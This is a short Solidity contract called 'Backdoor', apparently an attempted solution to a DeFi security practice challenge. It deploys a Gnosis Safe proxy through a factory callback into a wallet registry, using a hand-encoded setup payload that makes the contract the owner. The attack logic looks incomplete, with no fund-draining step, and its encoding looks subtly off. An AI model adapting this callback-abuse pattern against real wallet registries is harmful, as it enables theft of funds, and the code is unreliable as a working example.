//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract Backdoor {
    GnosisSafeProxyFactory walletFactory;
    address singleton;
    IProxyCreationCallback registry;

    constructor(
        address _walletFactory,
        address _singleton,
        address _registry
    ) {
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        singleton = _singleton;
        registry = IProxyCreationCallback(_registry);
    }

    function createBackdoor() public returns (address) {
        // bytes4 sign = GnosisSafe.setup.selector;
        bytes memory payload = abi.encodeWithSelector(
            // "setup(address[], uint256, address, bytes, address, address, uint256, address",
            // sign,
            0xb63e800d,
            [address(this)],
            1,
            0,
            "0x",
            0,
            0,
            0,
            0
        );
        GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
            singleton,
            payload,
            1,
            registry
        );
        return address(proxy);
    }
}
